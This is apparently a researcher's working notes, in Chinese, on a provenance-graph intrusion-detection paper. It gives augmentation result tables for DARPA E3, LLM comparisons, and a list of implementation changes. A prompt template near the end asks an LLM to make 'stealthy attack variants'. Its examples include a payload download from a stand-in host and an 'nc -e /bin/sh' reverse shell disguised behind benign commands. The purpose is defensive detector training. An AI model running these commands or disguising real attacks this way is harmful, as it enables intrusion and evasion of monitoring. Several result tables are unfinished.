# RQ2 实验结果与分析

## Table IV: Detection Performance of Different Augmentation Strategies on DARPA E3

**Cadets/cadets314**（测试集 84，正样本 6）

| Strategy | Acc | Prec | F1 | Rec | FPR | TP | FP | TN | FN |
|----------|-----|------|-----|-----|-----|----|----|----|----|
| No Aug | 95.2 | 100.0 | 50.0 | 33.3 | 0.0 | 2 | 0 | 78 | 4 |
| GraphCL | 96.4 | 80.0 | 72.7 | 66.7 | 1.3 | 4 | 1 | 77 | 2 |
| GCA | 95.2 | 66.7 | 66.7 | 66.7 | 2.6 | 4 | 2 | 76 | 2 |
| Mimicry | 91.7 | 33.3 | 22.2 | 16.7 | 2.6 | 1 | 2 | 76 | 5 |
| LLM-guided | **97.6** | **100.0** | **80.0** | **66.7** | **0.0** | 4 | 0 | 78 | 2 |

**Trace/trace315**（测试集 14，正样本 7）

| Strategy | Acc | Prec | F1 | Rec | FPR | TP | FP | TN | FN |
|----------|-----|------|-----|-----|-----|----|----|----|----|
| No Aug | 71.4 | 66.7 | 75.0 | 85.7 | 42.9 | 6 | 3 | 4 | 1 |
| GraphCL | 64.3 | 62.5 | 66.7 | 71.4 | 42.9 | 5 | 3 | 4 | 2 |
| GCA | **78.6** | 70.0 | **82.4** | **100.0** | 42.9 | 7 | 3 | 4 | 0 |
| Mimicry | 64.3 | 62.5 | 66.7 | 71.4 | 42.9 | 5 | 3 | 4 | 2 |
| LLM-guided | 64.3 | 62.5 | 66.7 | 71.4 | 42.9 | 5 | 3 | 4 | 2 |

**Theia/theia311**（测试集 56，正样本 15）

| Strategy | Acc | Prec | F1 | Rec | FPR | TP | FP | TN | FN |
|----------|-----|------|-----|-----|-----|----|----|----|----|
| No Aug | 76.8 | 58.3 | 51.9 | 46.7 | 12.2 | 7 | 5 | 36 | 8 |
| GraphCL | 73.2 | 50.0 | **54.5** | **60.0** | 22.0 | 9 | 9 | 32 | 6 |
| GCA | **78.6** | **71.4** | 45.5 | 33.3 | **4.9** | 5 | 2 | 39 | 10 |
| Mimicry | 69.6 | 45.5 | 54.1 | **66.7** | 29.3 | 10 | 12 | 29 | 5 |
| LLM-guided | 39.3 | 30.6 | 46.9 | **100.0** | 82.9 | 15 | 34 | 7 | 0 |

**ClearScope/clearscope3.6**（测试集 42，正样本 6）

| Strategy | Acc | Prec | F1 | Rec | FPR | TP | FP | TN | FN |
|----------|-----|------|-----|-----|-----|----|----|----|----|
| No Aug | 50.0 | 17.4 | 27.6 | 66.7 | 52.8 | 4 | 19 | 17 | 2 |
| GraphCL | 71.4 | 0.0 | 0.0 | 0.0 | 16.7 | 0 | 6 | 30 | 6 |
| GCA | **83.3** | 33.3 | 22.2 | 16.7 | **5.6** | 1 | 2 | 34 | 5 |
| Mimicry | **88.1** | **100.0** | **28.6** | 16.7 | **0.0** | 1 | 0 | 36 | 5 |
| LLM-guided | 52.4 | 18.2 | 28.6 | **66.7** | 50.0 | 4 | 18 | 18 | 2 |

**跨数据集汇总**（合并四个数据集的 TP/FP/TN/FN 后计算）

| Strategy | Acc | Prec | F1 | Rec | FPR | TP | FP | TN | FN |
|----------|-----|------|-----|-----|-----|----|----|----|----|
| No Aug | 78.6 | 41.3 | 47.5 | 55.9 | 16.7 | 19 | 27 | 135 | 15 |
| GraphCL | 82.1 | 48.6 | 50.7 | 52.9 | 11.7 | 18 | 19 | 143 | 16 |
| GCA | **86.7** | **65.4** | **56.7** | 50.0 | **5.6** | 17 | 9 | 153 | 17 |
| Mimicry | 82.7 | 50.0 | 50.0 | 50.0 | 10.5 | 17 | 17 | 145 | 17 |
| LLM-guided | 68.9 | 33.7 | 47.9 | **82.4** | 34.0 | 28 | 55 | 107 | 6 |

## Table IX: LLM Model Comparison (theia311)

Ego 级变异 pipeline（EgoMutationPipeline），每快照 5 个变异 ego，对比学习每快照采样 5 个负样本。

### Table IX-A: 标准测试（ego 级）

| Augmentation | LLM Model | Acc | Prec | Rec | F1 | TP | FP | TN | FN |
|---|---|---|---|---|---|---|---|---|---|
| No Aug | - | 95.00% | 61.98% | 99.01% | 76.24% | 300 | 184 | 3252 | 3 |
| GraphCL | - | 99.33% | 94.67% | 96.93% | 95.78% | 284 | 16 | 3430 | 9 |
| GCA | - | 97.30% | 75.38% | 99.01% | 85.59% | 300 | 98 | 3338 | 3 |
| Mimicry | - | 90.40% | 45.68% | 97.69% | 62.25% | 296 | 352 | 3084 | 7 |
| LLM-guided | 无LLM（仅结构变异） | 96.84% | 71.22% | 100.00% | 83.19% | 292 | 118 | 3329 | 0 |
| LLM-guided | GPT-4o | 97.59% | 76.88% | 99.66% | 86.80% | 296 | 89 | 3353 | 1 |
| LLM-guided | Qwen2.5-7B | 95.93% | 66.22% | 99.66% | 79.57% | 296 | 151 | 3291 | 1 |
| LLM-guided | Qwen2.5-14B | 98.29% | 82.45% | 99.66% | 90.24% | 296 | 63 | 3379 | 1 |
| LLM-guided | DeepSeek-V3 | 94.46% | 58.93% | 100.00% | 74.16% | 297 | 207 | 3235 | 0 |
| LLM-guided | GLM-4-9B | 95.51% | 63.93% | 99.66% | 77.89% | 296 | 167 | 3275 | 1 |

### Table IX-B: 标准测试（快照级）

| Augmentation | LLM Model | Acc | Prec | Rec | F1 | TP | FP | TN | FN |
|---|---|---|---|---|---|---|---|---|---|
| No Aug | - | 75.00% | 52.38% | 100.00% | 68.75% | 22 | 20 | 38 | 0 |
| GraphCL | - | 92.50% | 83.33% | 90.91% | 86.96% | 20 | 4 | 54 | 2 |
| GCA | - | 83.75% | 62.86% | 100.00% | 77.19% | 22 | 13 | 45 | 0 |
| Mimicry | - | 85.00% | 65.62% | 95.45% | 77.78% | 21 | 11 | 47 | 1 |
| LLM-guided | 无LLM（仅结构变异） | 86.25% | 66.67% | 100.00% | 80.00% | 22 | 11 | 47 | 0 |
| LLM-guided | GPT-4o | 85.00% | 64.71% | 100.00% | 78.57% | 22 | 12 | 46 | 0 |
| LLM-guided | Qwen2.5-7B | 85.00% | 64.71% | 100.00% | 78.57% | 22 | 12 | 46 | 0 |
| LLM-guided | Qwen2.5-14B | 85.00% | 64.71% | 100.00% | 78.57% | 22 | 12 | 46 | 0 |
| LLM-guided | DeepSeek-V3 | 83.75% | 62.86% | 100.00% | 77.19% | 22 | 13 | 45 | 0 |
| LLM-guided | GLM-4-9B | 86.25% | 66.67% | 100.00% | 80.00% | 22 | 11 | 47 | 0 |

### 结果与分析

Table IV 报告了各增强策略在 DARPA E3 四个数据集上的检测性能。合并全部样本后，**GCA（F1=56.7%）> GraphCL（50.7%）> Mimicry（50.0%）> LLM-guided（47.9%）> No Aug（47.5%）**。

**No Aug** 不做任何增强。恶意 ego subgraph 数量极少（如 Cadets 仅 18 个中心），对比学习中这些样本被反复采样，编码器对恶意类的表示发生坍缩——所有恶意嵌入聚集到嵌入空间中一个极小区域。下游 MLP 分类器只能基于这个坍缩簇拟合决策边界，无法覆盖恶意行为的真实分布，导致 FP=27（将落在簇附近的良性样本误判）和 Prec=41.3%。

**GraphCL** 通过均匀随机扰动（删边+掩特征）生成增强视图，F1（50.7%）略优于基线，但均匀扰动不区分节点重要性，在攻击样本稀缺时产生的变体多样性有限。

**GCA** 的度感知增强取得最优综合性能：F1=56.7%、Prec=65.4%、FPR=5.6% 均为最优。溯源图中恶意节点的度分布与良性节点显著不同，度感知增强对不同度的节点施加差异化扰动，最大化了有限负样本的变体多样性，使编码器学到基于度分布模式的判别特征。

**Mimicry** 向攻击子图注入良性边模拟隐蔽攻击。问题在于注入良性边直接破坏了攻击子图的判别性拓扑特征（如异常低度进程、短路径攻击链），增强后的图在结构上已接近良性图，但仍以恶意标签参与对比学习。编码器被迫将结构上像良性的样本编码到恶意区域，学到的恶意/良性边界模糊不清，FN=17（最高）——真实攻击因结构特征与训练中"被良性边稀释"的伪攻击不一致而漏检。

**LLM-guided** 通过变异流水线扩充恶意样本池，Rec 最高（82.4%，FN 仅 6），漏报最少，但 FPR 也最高（34.0%），说明变异图过于激进导致编码器偏向将正常快照判为恶意。当前使用规则 fallback 进行语义变异（llm_model=None），引入真实 LLM 有望提升变异图语义质量，在保持高召回的同时降低误报。

### Table IX-C: 攻击变体测试（ego 级）

历史数据（旧版代码跑的，待用新代码重跑补全 LLM 模型行）

| Augmentation | LLM Model | Acc | Prec | Rec | F1 | TP | FP | TN | FN | Rec衰减 |
|---|---|---|---|---|---|---|---|---|---|---|
| No Aug | - | 83.69% | 39.72% | 38.52% | 39.11% | 141 | 214 | 2112 | 225 | -60.49% |
| GraphCL | - | 89.41% | 85.58% | 24.79% | 38.44% | 89 | 15 | 2318 | 270 | -71.80% |
| GCA | - | 84.14% | 41.46% | 40.44% | 40.94% | 148 | 209 | 2117 | 218 | -58.57% |
| Mimicry | - | 89.45% | 81.36% | 26.82% | 40.34% | 96 | 22 | 2312 | 262 | -68.56% |
| LLM-guided | 无LLM（仅结构变异） | 87.89% | 52.61% | 87.68% | 65.76% | 313 | 282 | 2053 | 44 | -11.99% |
| LLM-guided | GPT-4o | - | - | - | - | - | - | - | - | - |
| LLM-guided | Qwen2.5-7B | - | - | - | - | - | - | - | - | - |
| LLM-guided | Qwen2.5-14B | - | - | - | - | - | - | - | - | - |
| LLM-guided | DeepSeek-V3 | - | - | - | - | - | - | - | - | - |
| LLM-guided | GLM-4-9B | - | - | - | - | - | - | - | - | - |

### Table IX-D: 攻击变体测试（快照级）

历史数据（旧版代码跑的，待用新代码重跑补全 LLM 模型行）

| Augmentation | LLM Model | Acc | Prec | Rec | F1 | TP | FP | TN | FN | Rec衰减 |
|---|---|---|---|---|---|---|---|---|---|---|
| No Aug | - | 90.76% | 75.00% | 78.26% | 76.60% | 18 | 6 | 90 | 5 | -21.74% |
| GraphCL | - | 90.76% | 83.33% | 65.22% | 73.17% | 15 | 3 | 93 | 8 | -25.69% |
| GCA | - | 91.60% | 76.00% | 82.61% | 79.17% | 19 | 6 | 90 | 4 | -17.39% |
| Mimicry | - | 90.76% | 80.00% | 69.57% | 74.42% | 16 | 4 | 92 | 7 | -25.89% |
| LLM-guided | 无LLM（仅结构变异） | 92.44% | 71.88% | 100.00% | 83.64% | 23 | 9 | 87 | 0 | 0.00% |
| LLM-guided | GPT-4o | - | - | - | - | - | - | - | - | - |
| LLM-guided | Qwen2.5-7B | - | - | - | - | - | - | - | - | - |
| LLM-guided | Qwen2.5-14B | - | - | - | - | - | - | - | - | - |
| LLM-guided | DeepSeek-V3 | - | - | - | - | - | - | - | - | - |
| LLM-guided | GLM-4-9B | - | - | - | - | - | - | - | - | - |

## Table V: Attack Variant Usability (theia311)

论文 RQ2(2)：人工评估 LLM 生成的攻击变体质量。每个 LLM 生成 100 个变体，3 名博士生独立评分（1-5 Likert），评估操作合法性、文件路径真实性、进程关系一致性。Usability rate = 评分 ≥4 的比例。

| Model | Size | Provider | Direct | Filtered |
|---|---|---|---|---|
| GPT-4o | - | chatanywhere | - | - |
| Qwen2.5 | 7B | siliconflow | - | - |
| Qwen2.5 | 14B | siliconflow | - | - |
| DeepSeek-V3 | 671B | siliconflow | - | - |
| GLM-4 | 9B | siliconflow | - | - |

状态：待做（需人工评估）

## Table VI: LLM Token Consumption and Latency Per Variant (theia311)

论文 RQ2(3)：评估 LLM 集成的部署开销，测量每个快照的平均 token 消耗和推理延迟。

| Model | Size | Provider | Tokens | Latency (s) |
|---|---|---|---|---|
| GPT-4o | - | chatanywhere | 3836 | 8.87 |
| Qwen2.5 | 7B | siliconflow | 2664 | 7.62 |
| Qwen2.5 | 14B | siliconflow | 1896 | 4.75 |
| DeepSeek-V3 | 671B | siliconflow | 12230 | 123.73 |
| GLM-4 | 9B | siliconflow | 8455 | 17.40 |

## 实现与论文差异记录

以下记录实际实现与论文（bare_jrnl_new_sample4.pdf）描述的差异。

### 1. 变异粒度：快照级 → Ego 级

| | 论文描述 | 实际实现 |
|---|---|---|
| 变异单位 | 快照级（~500 节点） | **Ego 级**（~32 节点） |
| 原因 | 论文 Algorithm 1 在整个快照 G_b 上做子图替换 | 快照级变异攻击节点仅占 ~4%，信号被良性上下文稀释；ego 级攻击节点占 30-50%，对比学习信号更清晰 |
| 实现 | MutationPipeline（快照级，保留未用） | **EgoMutationPipeline**：以攻击/良性节点为中心提取 r-hop ego 子图，在 ego 粒度做 WL 匹配 + 子图替换 |

### 2. LLM 候选选择：省略

| | 论文描述 | 实际实现 |
|---|---|---|
| 候选排序 | Algorithm 1 Line 24-26：LLM 对 top-m 候选打分（operational compatibility + behavioral similarity），选最优候选 | **省略**：直接取结构对齐得分最高的候选，不用 LLM 打分 |
| 原因 | 每次变异多调一次 LLM 打分开销太大（ego 级变异量 ~1000 个），且结构对齐得分已能有效筛选 |

### 3. 统一验证：Ego 级省略

| | 论文描述 | 实际实现 |
|---|---|---|
| 验证 | 4 项统一验证（Operation Legality, Attribute Feasibility, Imperceptibility, Hardness） | 快照级 MutationPipeline 保留验证；**Ego 级 EgoMutationPipeline 省略验证** |
| 原因 | Ego 子图太小（~32 节点），历史行为 profile 统计量不足，验证容易误拒；且 ego 级攻击信号占比高，不需要 hardness 阈值过滤 |

### 4. 语义变异 Prompt：增强攻击语义保留指导

| | 论文描述 | 实际实现 |
|---|---|---|
| Prompt | Figure 5：传入 attributes、associated_nodes、strategy、context，让 LLM 按策略变异 | **增强版**：额外传入 `ATTACK-SPECIFIC (must keep)` 和 `BENIGN (can replace)` 标注，明确告诉 LLM 哪些部分在 H_b 中（可替换）、哪些不在（必须保留） |
| 良性语料 | Prompt 中通过 context C 隐式提供 | **显式传入** `benign_commands` 列表，供 LLM 选择替换值 |
| 原因 | Qwen2.5-7B 等小模型不理解隐式语义约束，会把整个 cmdLine 替换成良性操作，丢失攻击语义（如 `&>/dev/null &` 后台隐蔽执行被丢弃）。显式标注后变异质量显著提升 |

**改进后 Prompt 模板**（对应论文 Figure 5）：

```
You are creating stealthy attack variants in a provenance graph.
Properties format: cmdLine,tgid,path (3 comma-separated fields).

## Key principle
Each node has ATTACK-SPECIFIC parts and BENIGN parts, determined by historical benign data H_b.
- ATTACK-SPECIFIC (not in H_b): MUST be preserved — this is the attack semantics.
- BENIGN (in H_b): can be replaced with other benign values to disguise the attack.

## Strategies
- replacement: command name is benign (in H_b), args are attack-specific (not in H_b).
  → Keep the attack args, replace the command name with a different benign command.
  Example: wget http://mal.com/pay.sh,1234,/usr/bin/wget
  KEEP: http://mal.com/pay.sh  REPLACE: wget
  → curl -H "X-Health-Check: true" http://mal.com/pay.sh,1234,/usr/bin/curl

- rewriting: both command and args are benign (in H_b).
  → Rewrite the entire cmdLine to fit the surrounding context.
  Example: python /tmp/script.py,5678,/usr/bin/python
  → php /var/www/cgi-bin/handler.php,5678,/usr/bin/php

- extension: both command and args are attack-specific (not in H_b).
  → Keep the ENTIRE command unchanged, prepend/append benign operations.
  Example: nc -e /bin/sh attacker 4444,9999,/usr/bin/nc
  KEEP ALL. Wrap it:
  → systemctl status nginx && nc -e /bin/sh attacker 4444,9999,/usr/bin/nc

## Benign commands from H_b (use as replacements)
{benign_commands_list}

## Nodes to mutate ({n})

Node 1:
  properties: {current_properties}
  strategy: {assigned_strategy}
  ATTACK-SPECIFIC (must keep): {parts_not_in_Hb}
  BENIGN (can replace): {parts_in_Hb}
  context: {context_triples}

## Output
Return ONLY a JSON array:
[{"node_id": 1, "new_properties": "cmdLine,tgid,path"}]

Rules:
1. Output format: cmdLine,tgid,path (exactly 3 fields, keep tgid unchanged)
2. ATTACK-SPECIFIC parts MUST appear in new_properties
3. Only replace BENIGN parts with other benign values
4. Do NOT include metadata (strategy, context, etc.) in new_properties
```

**与论文 Figure 5 的关键差异**：
1. 新增 `ATTACK-SPECIFIC (must keep)` / `BENIGN (can replace)` 字段：代码中 `_assign_strategy` 已根据 H_b 判断 cmd/args 是否在良性语料中，将判断结果直接标注在 prompt 中，避免 LLM 自行推断
2. 新增 `Benign commands from H_b` 列表：显式提供良性命令供 LLM 选择替换值，而非仅靠 context C 隐式推断
3. 每种策略配了具体的 BEFORE→AFTER 示例，明确展示哪些保留、哪些替换

### 5. LLM 调用方式：串行 → 并发

| | 论文描述 | 实际实现 |
|---|---|---|
| 调用方式 | 未提及 | **两阶段流水线**：阶段 1 串行做结构变异（~8s），阶段 2 用 ThreadPoolExecutor 8 线程并发调 LLM（~260s），总计 ~4.5 分钟 vs 串行 ~42 分钟 |

### 6. 变异质量分析（Qwen2.5-7B on theia311）

原始 prompt（论文 Figure 5 格式）下 Qwen2.5-7B 的变异质量问题：

| 问题 | 占比 | 说明 |
|---|---|---|
| 元数据泄漏 | ~20% | LLM 把 prompt 中的 associated_nodes=、strategy=、C={} 混入输出的 new_properties |
| 攻击语义丢失 | ~50% | `&>/dev/null &`（后台隐蔽执行）99% 被丢弃，`/native-messaging-hosts/`（浏览器扩展伪装路径）87% 被丢弃 |
| 仅改 shell 类型 | ~58% | 只做 dash→sh/bash 的微调，实质上无变化 |

改进后（显式标注 ATTACK-SPECIFIC/BENIGN + 传入良性命令列表）待验证。

## 已知问题

- [ ] 结果方差大：同一配置多次运行差异显著，需固定随机种子多次运行取平均
- [ ] ClearScope 各策略 F1 偏低，需排查数据质量或快照切分问题
- [ ] 攻击变体测试（Table IX）数据不完整，需跑 benchmark_robustness.py
- [ ] 改进 prompt 后的 Qwen2.5-7B 变异质量待验证
